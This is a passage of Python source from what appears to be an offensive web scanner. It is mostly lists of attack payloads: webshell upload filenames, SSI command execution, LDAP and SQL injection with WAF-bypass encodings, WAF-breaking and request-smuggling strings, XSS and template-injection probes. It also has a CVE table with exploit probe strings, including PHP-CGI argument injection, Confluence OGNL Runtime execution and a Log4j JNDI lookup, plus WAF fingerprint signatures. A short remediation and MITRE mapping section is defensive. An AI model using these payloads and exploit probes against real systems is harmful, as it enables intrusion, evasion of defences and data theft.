    "shell.php::$DATA","shell.php","shell.php.jpg","shell.pHp","shell.php%00.jpg","shell.phtml","shell.phar",
    ".htaccess","shell.php::$DATA","shell.php","shell.php.jpg","shell.pHp","shell.php%00.jpg","shell.phtml",
    "shell.phar",".htaccess","shell.php::$DATA","shell.php","shell.php.jpg","shell.pHp","shell.php%00.jpg",
    "shell.phtml","shell.phar",".htaccess","shell.php::$DATA",
]

PAYLOADS_SSI = [
    '<!--#exec cmd="id" -->','<!--#include virtual="/etc/passwd" -->','<!--#echo var="DATE_LOCAL" -->',
    '<!--#exec cmd="id" -->','<!--#include virtual="/etc/passwd" -->','<!--#echo var="DATE_LOCAL" -->',
    '<!--#exec cmd="id" -->','<!--#include virtual="/etc/passwd" -->','<!--#echo var="DATE_LOCAL" -->',
]

PAYLOADS_FMT = [
    "%x%x%x%x","%s%s%s%s","%n%n%n%n","%99999999d","%x%x%x%x","%s%s%s%s","%n%n%n%n","%99999999d",
    "%x%x%x%x","%s%s%s%s","%n%n%n%n","%99999999d","%x%x%x%x","%s%s%s%s","%n%n%n%n","%99999999d",
]

PAYLOADS_IDOR = [
    "/api/user/1","/api/user/2","/api/users/1","/api/account/1","/user?id=1","/user?id=2","/api/user/1",
    "/api/user/2","/api/users/1","/api/account/1","/user?id=1","/user?id=2","/api/user/1","/api/user/2",
    "/api/users/1","/api/account/1","/user?id=1","/user?id=2",
]

PAYLOADS_MASS_ASSIGN = [
    '{"username":"user","email":"u@u.com","role":"admin","is_admin":true}','{"username":"user","admin":true}',
    '{"username":"user","verified":true}','{"username":"user","email":"u@u.com","role":"admin","is_admin":true}',
    '{"username":"user","admin":true}','{"username":"user","verified":true}',
    '{"username":"user","email":"u@u.com","role":"admin","is_admin":true}','{"username":"user","admin":true}',
    '{"username":"user","verified":true}','{"username":"user","email":"u@u.com","role":"admin","is_admin":true}',
    '{"username":"user","admin":true}','{"username":"user","verified":true}',
]

PAYLOADS_SUBDOMAIN = [
    "admin","test","dev","staging","api","mail","ftp","vpn","portal","dashboard","blog","shop","m","mobile",
    "static","cdn","assets","img","media","video","support","help","docs","wiki","status","monitor",
    "admin","test","dev","staging","api","mail","ftp","vpn","portal","dashboard","blog","shop","m","mobile",
    "static","cdn","assets","img","media","video","support","help","docs","wiki","status","monitor",
]

PAYLOADS_LDAP = [
    "*","*)(uid=*","*)(|(uid=*","*)(&(uid=*","admin)(&)","admin)(|(password=*))","*)(objectClass=*",
    "*)(&(objectClass=*)","*)(uid=*)((uid=*)","(&(uid=*)(objectClass=*))","*)(cn=*","*))(|(cn=*",
    "*))%00","*)(uid=*))(|(uid=*","\\","*","*)(uid=*","*)(|(uid=*","*)(&(uid=*","admin)(&)",
    "admin)(|(password=*))","*)(objectClass=*","*)(&(objectClass=*)","*)(uid=*)((uid=*)",
    "(&(uid=*)(objectClass=*))","*)(cn=*","*))(|(cn=*","*))%00","*)(uid=*))(|(uid=*","\\","*",
    "*)(uid=*","*)(|(uid=*","*)(&(uid=*","admin)(&)","admin)(|(password=*))","*)(objectClass=*",
    "*)(&(objectClass=*)","*)(uid=*)((uid=*)","(&(uid=*)(objectClass=*))","*)(cn=*","*))(|(cn=*",
    "*))%00","*)(uid=*))(|(uid=*","\\",
]

PAYLOADS_WAF_BYPASS = [
    "%27%20OR%201%3D1--","0x61646d696e","CHAR(39,79,82,39,49,39,61,39,49)","'/**/OR/**/1=1--","'OR%091=1--",
    "'OR%0a1=1--","'OR%0b1=1--","'OR%0c1=1--","'OR%0d1=1--","'OR%a01=1--","'/*!50000OR*/1=1--",
    "'/*!50000OR*//*!500001=1*/--","' %09 OR %09 '1'='1","' %0a OR %0a '1'='1","' %0b OR %0b '1'='1",
    "' %0c OR %0c '1'='1","' %0d OR %0d '1'='1","' %a0 OR %a0 '1'='1","UN/**/ION SEL/**/ECT 1,2,3--",
    "uNiOn SeLeCt 1,2,3--","UNI%00ON SELECT 1,2,3--","' OR 0x31=0x31--","' OR CHAR(49)=CHAR(49)--",
    "' OR TRUE--","' OR !FALSE--","' OR 1=1\u0000--","SELSELECTECT 1,2,3","UNUNIONION SELECT 1","＇ OR 1=1--",
    "＇OR＇1＇=＇1","' OR 1 LIKE 1--","' OR 1 BETWEEN 1 AND 1--","' oR 1=1--","' Or 1=1--","' oR '1'='1",
    "%27%20OR%201%3D1--","0x61646d696e","CHAR(39,79,82,39,49,39,61,39,49)","'/**/OR/**/1=1--","'OR%091=1--",
    "'OR%0a1=1--","'OR%0b1=1--","'OR%0c1=1--","'OR%0d1=1--","'OR%a01=1--","'/*!50000OR*/1=1--",
    "'/*!50000OR*//*!500001=1*/--","' %09 OR %09 '1'='1","' %0a OR %0a '1'='1","' %0b OR %0b '1'='1",
    "' %0c OR %0c '1'='1","' %0d OR %0d '1'='1","' %a0 OR %a0 '1'='1","UN/**/ION SEL/**/ECT 1,2,3--",
    "uNiOn SeLeCt 1,2,3--","UNI%00ON SELECT 1,2,3--","' OR 0x31=0x31--","' OR CHAR(49)=CHAR(49)--",
    "' OR TRUE--","' OR !FALSE--","' OR 1=1\u0000--","SELSELECTECT 1,2,3","UNUNIONION SELECT 1","＇ OR 1=1--",
    "＇OR＇1＇=＇1","' OR 1 LIKE 1--","' OR 1 BETWEEN 1 AND 1--","' oR 1=1--","' Or 1=1--","' oR '1'='1",
]

PAYLOADS_WAF_BREAK = [
    "a"*1000+"!","("*100,"*"*100,"A"*50000,"€"*1000,"\x00"*100,
    "GET / HTTP/1.1\r\nHost: example.com\r\nX: "+"A"*10000,
    "Transfer-Encoding: chunked\r\n\r\n"+"A"*1000,"X-Forwarded-For: "+", ".join(["1.1.1.1"]*500),
    "a"*1000+"!","("*100,"*"*100,"A"*50000,"€"*1000,"\x00"*100,
    "GET / HTTP/1.1\r\nHost: example.com\r\nX: "+"A"*10000,
    "Transfer-Encoding: chunked\r\n\r\n"+"A"*1000,"X-Forwarded-For: "+", ".join(["1.1.1.1"]*500),
    "a"*1000+"!","("*100,"*"*100,"A"*50000,"€"*1000,"\x00"*100,
    "GET / HTTP/1.1\r\nHost: example.com\r\nX: "+"A"*10000,
    "Transfer-Encoding: chunked\r\n\r\n"+"A"*1000,"X-Forwarded-For: "+", ".join(["1.1.1.1"]*500),
]

PAYLOADS_SESSION_HIJACK = [
    '{"alg":"none","typ":"JWT"}',"PHPSESSID=apexora","JSESSIONID=apexora","ASP.NET_SessionId=apexora",
    '{"alg":"HS256","typ":"JWT"}','{"alg":"none","typ":"JWT"}',"PHPSESSID=apexora","JSESSIONID=apexora",
    "ASP.NET_SessionId=apexora",'{"alg":"HS256","typ":"JWT"}','{"alg":"none","typ":"JWT"}',
    "PHPSESSID=apexora","JSESSIONID=apexora","ASP.NET_SessionId=apexora",'{"alg":"HS256","typ":"JWT"}',
]

PAYLOADS_WAF_ADMIN = [
    "/admin/waf","/waf-admin","/.waf/","/waf/console","/api/waf/rules","/api/v1/waf","/management/waf",
    "/mgmt/shared/authn/login","/mgmt/tm/security/firewall","/vpns/","/citrix/","/vpn/index.html","/fortiweb/",
    "/api/v2/cmdb/firewall","/api/?type=config&action=set","/modsecurity/","/.modsec/","/cdn-cgi/trace",
    "/cdn-cgi/peek","/admin/waf","/waf-admin","/.waf/","/waf/console","/api/waf/rules","/api/v1/waf",
    "/management/waf","/mgmt/shared/authn/login","/mgmt/tm/security/firewall","/vpns/","/citrix/",
    "/vpn/index.html","/fortiweb/","/api/v2/cmdb/firewall","/api/?type=config&action=set","/modsecurity/",
    "/.modsec/","/cdn-cgi/trace","/cdn-cgi/peek",
]

PAYLOADS_CACHE_HEADERS = [
    "Accept","X-Forwarded-Host","Origin","X-Original-URL","X-Rewrite-URL","Accept","X-Forwarded-Host",
    "Origin","X-Original-URL","X-Rewrite-URL","Accept","X-Forwarded-Host","Origin","X-Original-URL",
    "X-Rewrite-URL",
]

PAYLOADS_WAF_TIMELINE = [
    "'","' OR","' OR 1","' OR 1=","' OR 1=1","' OR 1=1--","' UNION","' UNION SELECT","' UNION SELECT 1",
    "' UNION SELECT 1,2,3--","' AND SLEEP(5)--","'; WAITFOR DELAY '0:0:5'--","'","' OR","' OR 1","' OR 1=",
    "' OR 1=1","' OR 1=1--","' UNION","' UNION SELECT","' UNION SELECT 1","' UNION SELECT 1,2,3--",
    "' AND SLEEP(5)--","'; WAITFOR DELAY '0:0:5'--",
]

PAYLOADS_DOM_XSS = [
    "<img src=x onerror=alert(1)>","<svg/onload=alert(1)>","javascript:alert(1)",
    "<iframe srcdoc='<script>alert(1)</script>'>","<body onload=alert(1)>","<details open ontoggle=alert(1)>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(1)>","<svg/onload=alert(1)>","javascript:alert(1)",
    "<iframe srcdoc='<script>alert(1)</script>'>","<body onload=alert(1)>","<details open ontoggle=alert(1)>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
]

PAYLOADS_ANGULAR = [
    "{{constructor.constructor('alert(1)')()}}","{{$eval.constructor('alert(1)')()}}",
    "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}",
    "{{constructor.constructor('alert(1)')()}}","{{$eval.constructor('alert(1)')()}}",
    "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}",
    "{{constructor.constructor('alert(1)')()}}","{{$eval.constructor('alert(1)')()}}",
    "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}",
]

PAYLOADS_VUE = [
    "{{_c.constructor('alert(1)')()}}","{{constructor.constructor('alert(1)')()}}",
    "{{_c.constructor('alert(1)')()}}","{{constructor.constructor('alert(1)')()}}",
    "{{_c.constructor('alert(1)')()}}","{{constructor.constructor('alert(1)()')}}",
]

PAYLOADS_POSTMESSAGE = [
    "<script>window.parent.postMessage('xss','*')</script>",
    "<script>window.opener.postMessage({cmd:'exec',payload:'alert(1)'},'*')</script>",
    "<script>window.parent.postMessage('xss','*')</script>",
    "<script>window.opener.postMessage({cmd:'exec',payload:'alert(1)'},'*')</script>",
    "<script>window.parent.postMessage('xss','*')</script>",
    "<script>window.opener.postMessage({cmd:'exec',payload:'alert(1)'},'*')</script>",
]

PAYLOADS_WS_INJECT = [
    "' OR 1=1--","<script>alert(1)</script>",'{"$ne":null}',"{{7*7}}","../../etc/passwd","; id",
    "' OR 1=1--","<script>alert(1)</script>",'{"$ne":null}',"{{7*7}}","../../etc/passwd","; id",
    "' OR 1=1--","<script>alert(1)</script>",'{"$ne":null}',"{{7*7}}","../../etc/passwd","; id",
]

PAYLOADS_DOM_CLOBBER = [
    '<a id="config"></a><a id="config" name="url" href="javascript:alert(1)">',
    '<form id="config"><input name="action" value="javascript:alert(1)"></form>',
    '<img name="getElementById"><img name="body">',
    '<a id="config"></a><a id="config" name="url" href="javascript:alert(1)">',
    '<form id="config"><input name="action" value="javascript:alert(1)"></form>',
    '<img name="getElementById"><img name="body">',
    '<a id="config"></a><a id="config" name="url" href="javascript:alert(1)">',
    '<form id="config"><input name="action" value="javascript:alert(1)"></form>',
    '<img name="getElementById"><img name="body">',
]

PAYLOADS = {
    "sqli": PAYLOADS_SQLI, "sqli-blind": PAYLOADS_SQLI_BLIND, "xss": PAYLOADS_XSS, "nosql": PAYLOADS_NOSQL,
    "ssti": PAYLOADS_SSTI, "xxe": PAYLOADS_XXE, "ssrf": PAYLOADS_SSRF, "cmdi": PAYLOADS_CMDI, "lfi": PAYLOADS_LFI,
    "jwt": PAYLOADS_JWT, "oauth": PAYLOADS_OAUTH, "graphql": PAYLOADS_GRAPHQL, "deserial": PAYLOADS_DESER,
    "proto-pollution": PAYLOADS_PROTO, "log4j": PAYLOADS_LOG4J, "spring4shell": PAYLOADS_SPRING,
    "shellshock": PAYLOADS_SHELLSHOCK, "crlf": PAYLOADS_CRLF, "hpp": PAYLOADS_HPP, "cors": PAYLOADS_CORS,
    "upload": PAYLOADS_UPLOAD, "ssi": PAYLOADS_SSI, "fmt": PAYLOADS_FMT, "idor": PAYLOADS_IDOR,
    "mass-assign": PAYLOADS_MASS_ASSIGN, "subdomain": PAYLOADS_SUBDOMAIN, "ldap": PAYLOADS_LDAP,
    "waf-bypass": PAYLOADS_WAF_BYPASS, "waf-break": PAYLOADS_WAF_BREAK, "waf-admin-probe": PAYLOADS_WAF_ADMIN,
    "waf-timeline": PAYLOADS_WAF_TIMELINE, "session-hijack": PAYLOADS_SESSION_HIJACK,
    "dom-xss": PAYLOADS_DOM_XSS, "angular": PAYLOADS_ANGULAR, "vue": PAYLOADS_VUE,
    "postmessage": PAYLOADS_POSTMESSAGE, "websocket-inject": PAYLOADS_WS_INJECT, "dom-clobbering": PAYLOADS_DOM_CLOBBER,
}

REMEDIATION = {
    "error_based_sqli": "Use parameterized queries. OWASP SQLi Prevention.",
    "time_based_sqli": "Use parameterized queries. Never concatenate user input into SQL.",
    "blind_sqli": "Use parameterized queries.",
    "reflected_xss": "HTML-encode output. Set Content-Security-Policy nonce.",
    "dom_xss_reflection": "Sanitize DOM sinks. Use textContent instead of innerHTML.",
    "angularjs_sandbox": "Upgrade AngularJS (EOL). Migrate to Angular 2+.",
    "vue_template": "Never use v-html with untrusted input.",
    "nosql_bypass": "Validate input types. Reject $ operators in user input.",
    "ssti": "Do not compile user input as templates.",
    "xxe": "Disable external entities in XML parser.",
    "ssrf": "Block internal IP ranges. Whitelist allowed URLs.",
    "cmdi": "Never pass user input to shell. Use arrays with execve.",
    "lfi": "Use allowlist for filenames. Never concatenate paths.",
    "waf_bypass": "Update WAF rules. Test with CRS 4.x.",
    "missing_csp": "Add CSP: default-src 'self'; script-src 'self' 'nonce-<random>'",
    "missing_httponly": "Set HttpOnly on session cookies.",
    "missing_secure": "Set Secure on session cookies.",
    "missing_samesite": "Set SameSite=Lax or Strict.",
    "jwt_alg_none": "Reject alg=none. Enforce algorithm whitelist.",
    "oauth_redirect": "Validate redirect_uri against strict allowlist.",
    "graphql_introspection": "Disable introspection in production.",
    "proto_pollution": "Sanitize __proto__/constructor/prototype keys.",
    "log4shell": "Upgrade Log4j to 2.17.1+.",
    "spring4shell": "Upgrade Spring to 5.3.18+.",
    "shellshock": "Patch bash. Do not pass untrusted env vars.",
    "crlf_injection": "Sanitize CR/LF in headers.",
    "upload_bypass": "Validate MIME, magic bytes, and extension separately.",
    "missing_sri": "Add integrity=SRI hash to all external scripts.",
    "outdated_lib": "Upgrade library to latest patched version.",
    "csp_unsafe_inline": "Remove unsafe-inline. Use nonces.",
    "weak_tls": "Disable TLS 1.0/1.1. Use TLS 1.2+.",
    "weak_cipher": "Disable RC4, DES, MD5 ciphers.",
    "h2c_upgrade": "Reject HTTP/2 upgrade over cleartext.",
    "cl0_smuggle": "Reject mismatched Content-Length and Transfer-Encoding.",
    "conn_exhaust": "Add connection limits at L7 proxy.",
    "php2shell_vuln": "Upgrade PHP to 8.2.35+/8.3.36+/8.4.27+/8.5.12+.",
    "php2shell_upload_crash": "Disable session.upload_progress or upgrade PHP.",
    "cve_match": "Apply vendor patch. Check CISA KEV for exploitation status.",
    "cve_probe_only": "Protocol-level or client-side CVE. Cannot be HTTP-probed. Use the indicated protocol/tool.",
    "cve_executable": "HTTP-exploitable. Verified payload sent. Check evidence field.",
}

MITRE = {
    "error_based_sqli": "T1190 - Exploit Public-Facing Application",
    "time_based_sqli": "T1190",
    "reflected_xss": "T1059.007 - JavaScript",
    "dom_xss_reflection": "T1059.007",
    "xxe": "T1190",
    "ssrf": "T1190",
    "cmdi": "T1059.004 - Unix Shell",
    "lfi": "T1005 - Data from Local System",
    "log4shell": "T1190",
    "jwt_alg_none": "T1550 - Use Alternate Authentication Material",
    "upload_bypass": "T1105 - Ingress Tool Transfer",
    "proto_pollution": "T1059.007",
    "waf_bypass": "T1211 - Exploitation for Defense Evasion",
    "cve_match": "T1190",
    "php2shell_vuln": "T1190",
}

CVE_DB = {
"CVE-2024-4577":{"year":2024,"product":"PHP CGI Windows","type":"arg_injection","pre_auth":True,"rce":True,"cvss":9.8,"poc":True,"affects":"PHP 8.1<8.1.29","kev":True,"protocol":"http","probe":"/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input","detect":"PHP Version","test_payload":"%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"},
"CVE-2019-19781":{"year":2019,"product":"Citrix ADC","type":"traversal","pre_auth":True,"rce":True,"cvss":9.8,"poc":True,"affects":"Citrix ADC 10.5-13.0","kev":True,"protocol":"http","probe":"/vpn/../vpns/cfg/smb.conf","detect":"[global]","test_payload":"/vpn/../vpns/cfg/smb.conf"},
"CVE-2021-21985":{"year":2021,"product":"VMware vCenter","type":"rce","pre_auth":True,"rce":True,"cvss":9.8,"poc":True,"affects":"vCenter 6.5,6.7,7.0","kev":True,"protocol":"http","probe":"/ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setVmodlHelper/setTargetObject","detect":"vsanProviderUtils","test_payload":"/ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setVmodlHelper/setTargetObject"},
"CVE-2021-22005":{"year":2021,"product":"VMware vCenter","type":"file_upload","pre_auth":True,"rce":True,"cvss":9.8,"poc":True,"affects":"vCenter 6.7<6.7U3o","kev":True,"protocol":"http","probe":"/sdk","detect":"VMware vCenter Server","test_payload":"/sdk"},
"CVE-2021-44228":{"year":2021,"product":"Log4j","type":"jndi","pre_auth":True,"rce":True,"cvss":10.0,"poc":True,"affects":"Log4j <2.15","kev":True,"protocol":"http","probe":"/","detect":"jndi","test_payload":"${jndi:ldap://apexora.test/a}"},
"CVE-2021-26855":{"year":2021,"product":"Exchange Server","type":"ssrf","pre_auth":True,"rce":True,"cvss":9.8,"poc":True,"affects":"Exchange 2013-2019","kev":True,"protocol":"http","probe":"/owa/auth/logon.aspx","detect":"ProxyLogon","test_payload":"/owa/auth/logon.aspx"},
"CVE-2021-34473":{"year":2021,"product":"Exchange Server","type":"path_confusion","pre_auth":True,"rce":True,"cvss":9.8,"poc":True,"affects":"Exchange 2013-2019","kev":True,"protocol":"http","probe":"/autodiscover/autodiscover.json","detect":"Exchange","test_payload":"/autodiscover/autodiscover.json"},
"CVE-2022-22965":{"year":2022,"product":"Spring Framework","type":"classloader","pre_auth":True,"rce":True,"cvss":9.8,"poc":True,"affects":"Spring <5.3.18","kev":True,"protocol":"http","probe":"/","detect":"class.module","test_payload":"class.module.classLoader.resources.context.parent.pipeline.first.pattern=test"},
"CVE-2022-26134":{"year":2022,"product":"Atlassian Confluence","type":"ognl","pre_auth":True,"rce":True,"cvss":9.8,"poc":True,"affects":"Confluence <7.18","kev":True,"protocol":"http","probe":"/","detect":"Confluence","test_payload":"/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.getInputStream%28%29%29%29%7D/"},
"CVE-2023-34362":{"year":2023,"product":"MOVEit Transfer","type":"sql_injection","pre_auth":True,"rce":True,"cvss":9.8,"poc":True,"affects":"MOVEit <2023.0.1","kev":True,"protocol":"http","probe":"/human.aspx","detect":"MOVEit","test_payload":"/human.aspx"},
"CVE-2024-3400":{"year":2024,"product":"PAN-OS","type":"cmdi","pre_auth":True,"rce":True,"cvss":10.0,"poc":True,"affects":"PAN-OS 10.2/11","kev":True,"protocol":"http","probe":"/global-protect/login.esp","detect":"PAN-OS","test_payload":"/global-protect/login.esp"},
"CVE-2022-40684":{"year":2022,"product":"Fortinet FortiOS","type":"auth_bypass","pre_auth":True,"rce":True,"cvss":9.8,"poc":True,"affects":"FortiOS 7.0-7.2.1","kev":True,"protocol":"http","probe":"/api/v2/cmdb/system/admin","detect":"FortiGate","test_payload":"/api/v2/cmdb/system/admin"},
"CVE-2020-14882":{"year":2020,"product":"Oracle WebLogic","type":"rce","pre_auth":True,"rce":True,"cvss":9.8,"poc":True,"affects":"WebLogic 10.3.6-14.1.1","kev":True,"protocol":"http","probe":"/console/css/%252e%252e%252fconsole.portal","detect":"WebLogic","test_payload":"/console/css/%252e%252e%252fconsole.portal"},
"CVE-2023-4966":{"year":2023,"product":"Citrix Bleed","type":"session_leak","pre_auth":True,"rce":False,"cvss":9.4,"poc":True,"affects":"Citrix NetScaler 14.1<14.1-8.50","kev":True,"protocol":"http","probe":"/oauth/idp/.well-known/openid-configuration","detect":"Citrix","test_payload":"/oauth/idp/.well-known/openid-configuration"},
"CVE-2025-31324":{"year":2025,"product":"SAP NetWeaver","type":"file_upload","pre_auth":True,"rce":True,"cvss":10.0,"poc":True,"affects":"SAP NetWeaver 7.x","kev":True,"protocol":"http","probe":"/developmentserver/metadatauploader","detect":"SAP","test_payload":"/developmentserver/metadatauploader"},
"CVE-2025-4428":{"year":2025,"product":"Ivanti EPMM","type":"rce","pre_auth":True,"rce":True,"cvss":9.8,"poc":True,"affects":"Ivanti EPMM <11.12.0.4","kev":True,"protocol":"http","probe":"/mifs/aad/api/v2/ping","detect":"Ivanti","test_payload":"/mifs/aad/api/v2/ping"},
"CVE-2023-46604":{"year":2023,"product":"Apache ActiveMQ","type":"deserialization","pre_auth":True,"rce":True,"cvss":10.0,"poc":True,"affects":"ActiveMQ <5.15.16","kev":True,"protocol":"tcp:61616","note":"Raw TCP deserialization. Use ysoserial + connect to port 61616."},
"CVE-2024-21762":{"year":2024,"product":"FortiOS SSL-VPN","type":"oob_write","pre_auth":True,"rce":True,"cvss":9.8,"poc":True,"affects":"FortiOS 6.0-7.4.2","kev":True,"protocol":"https-special","note":"Binary heap overflow. No public HTTP PoC. Requires crafted binary payload to SSL-VPN endpoint."},
"CVE-2022-42475":{"year":2022,"product":"FortiOS","type":"heap_overflow","pre_auth":True,"rce":True,"cvss":9.8,"poc":False,"affects":"FortiOS 6.0-7.2.2","kev":True,"protocol":"https-special","note":"No public PoC. Binary heap overflow."},
"CVE-2025-2250":{"year":2025,"product":"Google Chrome V8","type":"type_confusion","pre_auth":True,"rce":True,"cvss":8.8,"poc":True,"affects":"Chrome <131.0.6778.204","kev":False,"protocol":"client-side","note":"Client-side browser exploit. Not testable from server side."},
"CVE-2021-4034":{"year":2021,"product":"Polkit pkexec","type":"lpe","pre_auth":True,"rce":True,"cvss":7.8,"poc":True,"affects":"polkit <0.120","kev":True,"protocol":"local","note":"Local privilege escalation. Requires shell on target OS."},
"CVE-2020-1472":{"year":2020,"product":"Windows Zerologon","type":"auth_bypass","pre_auth":True,"rce":True,"cvss":10.0,"poc":True,"affects":"Windows DC","kev":True,"protocol":"smb","note":"Requires SMB/RPC to domain controller. Not HTTP. Use impacket's zerologon_tester."},
"CVE-2021-34527":{"year":2021,"product":"Windows PrintNightmare","type":"rce","pre_auth":True,"rce":True,"cvss":8.8,"poc":True,"affects":"Windows Print Spooler","kev":True,"protocol":"smb","note":"Requires SMB to print spooler. Not HTTP. Use impacket-rpcdump."},
"CVE-2019-0708":{"year":2019,"product":"Windows RDP BlueKeep","type":"rce","pre_auth":True,"rce":True,"cvss":9.8,"poc":True,"affects":"Windows 7/2008","kev":True,"protocol":"rdp","note":"Requires RDP (port 3389). Not HTTP. Use rdp_check or Metasploit module."},
"CVE-2023-3824":{"year":2023,"product":"PHP phar","type":"buffer_overflow","pre_auth":True,"rce":True,"cvss":9.8,"poc":True,"affects":"PHP 8.0<8.0.30","kev":False,"protocol":"client-side","note":"Triggers when application reads a crafted phar file. Not server-side probeable."},
"CVE-2017-12617":{"year":2017,"product":"Apache Tomcat","type":"jsp_upload","pre_auth":True,"rce":True,"cvss":8.1,"poc":True,"affects":"Tomcat 7.0.0-7.0.81","kev":False,"protocol":"http","probe":"/","detect":"Apache-Coyote","test_payload":"PUT /test.jsp/ HTTP/1.1"},
}

WAF_SIGNATURES = {
"360PanYun":(["x-360","server:360"],["360"],["360panyun"],"360","Chinese CDN","HIGH"),
"360WangZhanBao":(["x-wzws-requested-method","x-denied-reason"],["wzws"],["wangzhanbao","360网站宝"],"360 (Qihoo)","Chinese Cloud WAF","VERY HIGH"),
"ACE XML Gateway":(["server:ace xml gateway"],["ace"],["ace xml gateway"],"Cisco","XML Gateway","VERY HIGH"),
"ASP.NET":(["x-aspnet-version","x-powered-by:asp.net"],["ASP.NET_SessionId"],["asp.net"],"Microsoft","Framework","LOW"),
"ASPA Firewall":(["server:aspa"],["aspa"],["aspa firewall"],"ASPA","WAF","VERY HIGH"),
"AWS ELB":(["server:awselb"],["AWSALB","AWSALBCORS"],["aws elastic load balancer"],"AWS","Load Balancer","HIGH"),
"AWS WAF":(["x-amzn-waf"],[],["aws waf"],"AWS","Cloud WAF","MEDIUM"),
"AWS Shield":(["x-amzn-requestid"],[],["aws shield"],"AWS","DDoS","MEDIUM"),
"Akamai":(["server:akamaighost","x-akamai-transformed"],["ak_bmsc","_abck"],["akamai","reference #"],"Akamai","CDN + WAF","HIGH"),
"Kona SiteDefender":(["server:kona"],["kona"],["kona site defender"],"Akamai","Enterprise WAF","VERY HIGH"),
"AliYunDun":(["server:aliyun"],["aliyundun","aliyungf_tc"],["aliyundun","aliyun"],"Alibaba","Cloud WAF","HIGH"),
"Airlock":(["server:airlock"],["airlock"],["airlock"],"Ergon","Swiss WAF","VERY HIGH"),
"Alert Logic":(["server:alertlogic"],["alertlogic"],["alert logic"],"Alert Logic","Cloud WAF","VERY HIGH"),
"Anquanbao":(["x-powered-by:anquanbao","server:anquanbao"],["anquanbao"],["anquanbao"],"Anquanbao","Cloud WAF","VERY HIGH"),
"AppWall":(["x-rdwr-","radware","x-sl-compstate"],["rdwr"],["radware","appwall"],"Radware","Enterprise WAF","VERY HIGH"),
"Armor Defense":(["x-armor"],["armor"],["armor defense"],"Armor","Cloud WAF","VERY HIGH"),
"ArvanCloud":(["server:arvancloud"],["arvancloud"],["arvancloud"],"ArvanCloud","Iranian CDN+WAF","VERY HIGH"),
"Azure App Gateway":(["server:microsoft-azure-application-gateway"],["ApplicationGatewayAffinity"],["azure application gateway"],"Azure","Cloud WAF","VERY HIGH"),
"Azure Front Door":(["x-azure-ref","x-fd-int-roxy"],["afd"],["azure front door"],"Azure","CDN+WAF","VERY HIGH"),
"BIG-IP APM":(["server:bigip"],["bigipapm"],["big-ip apm"],"F5","APM","HIGH"),
"BIG-IP ASM":(["x-wa-info","server:bigip"],["ts_","bigipserver","f5_cspm"],["the requested url was rejected","f5 networks"],"F5","Enterprise WAF","VERY HIGH"),
"BIG-IP LTM":(["server:bigip"],["bigipserver"],["big-ip ltm"],"F5","Load Balancer","HIGH"),
"F5 Silverline":(["server:f5"],["f5_cspm","TS"],["f5 networks"],"F5","Cloud WAF","HIGH"),
"Trafficshield":(["x-f5-trafficshield","server:f5-trafficshield"],["trafficshield","ASINFO"],["trafficshield"],"F5","WAF","VERY HIGH"),
"Barracuda":(["barra_counter_session","bnn"],["barra_counter_session","bnn"],["barracuda"],"Barracuda","Hardware WAF","VERY HIGH"),
"BitNinja":(["server:bitninja"],["bitninja"],["bitninja"],"BitNinja","Server Protection","VERY HIGH"),
"CacheFly":(["server:cachefly"],["cachefly"],["cachefly"],"CacheFly","CDN","HIGH"),
"ChinaCache":(["server:chinacache"],["chinacache"],["chinacache"],"ChinaCache","Chinese CDN","VERY HIGH"),
"Chuang Yu Shield":(["x-chuangyu"],["chuangyu"],["chuang yu shield"],"KnownSec","Cloud WAF","VERY HIGH"),
"Cloudflare":(["cf-ray","server:cloudflare","cf-cache-status"],["__cfduid","__cf_bm","cf_clearance","__cflb"],["cloudflare","cf-error","checking your browser"],"Cloudflare","CDN+WAF","HIGH"),
"Cloudfront":(["x-amz-cf-id","via:cloudfront"],["CloudFront"],["cloudfront"],"AWS","CDN","HIGH"),
"Comodo cWatch":(["server:comodo"],["comodo"],["comodo","cwatch"],"Comodo","Cloud WAF","HIGH"),
"DDoS-GUARD":(["server:ddos-guard"],["__ddg","__ddg1_","__ddg2_"],["ddos-guard"],"DDos-Guard","DDoS","VERY HIGH"),
"DataPower":(["x-datapower-transactionid"],["datapower"],["datapower"],"IBM","XML Gateway","VERY HIGH"),
"DenyALL":(["x-denyall"],["denyall"],["denyall"],"DenyALL","WAF","VERY HIGH"),
"Distil":(["x-distil"],["distil"],["distil networks"],"Distil","Bot Management","VERY HIGH"),
"DotDefender":(["x-dotdefender"],["dotdefender"],["dotdefender"],"Applicure","WAF","VERY HIGH"),
"Edgecast":(["server:ecs"],["edgecast"],["edgecast"],"Edgecast","CDN","HIGH"),
"Envoy":(["server:envoy"],[],["envoy proxy"],"Envoy","Proxy","HIGH"),
"Fastly":(["x-fastly-","fastly-","x-fastly-request-id"],["fastly"],["fastly"],"Fastly","CDN","HIGH"),
"FortiGate":(["server:fortigate"],["fortigate"],["fortigate"],"Fortinet","NGFW","VERY HIGH"),
"FortiGuard":(["server:fortiguard"],["fortiguard"],["fortiguard"],"Fortinet","WAF","VERY HIGH"),
"FortiWeb":(["fortiweb","x-fw-"],["fortiweb","fortiwafsID"],["fortiweb","attack detected"],"Fortinet","Enterprise WAF","VERY HIGH"),
"Google Cloud Armor":(["server:google"],["GCLB"],["google cloud app armor"],"Google","Cloud WAF","HIGH"),
"Huawei Cloud FW":(["server:huawei"],["huawei"],["huawei cloud firewall"],"Huawei","Cloud WAF","HIGH"),
"Imunify360":(["server:imunify360"],["imunify360"],["imunify360"],"CloudLinux","Server WAF","VERY HIGH"),
"Incapsula":(["x-iinfo","x-cdn:incapsula","server:imperva"],["visid_incap","incap_ses","nlbi"],["incapsula","request unsuccessful"],"Imperva","Cloud WAF","VERY HIGH"),
"Jiasule":(["server:jiasule"],["jiasule"],["jiasule"],"Jiasule","Chinese CDN+WAF","VERY HIGH"),
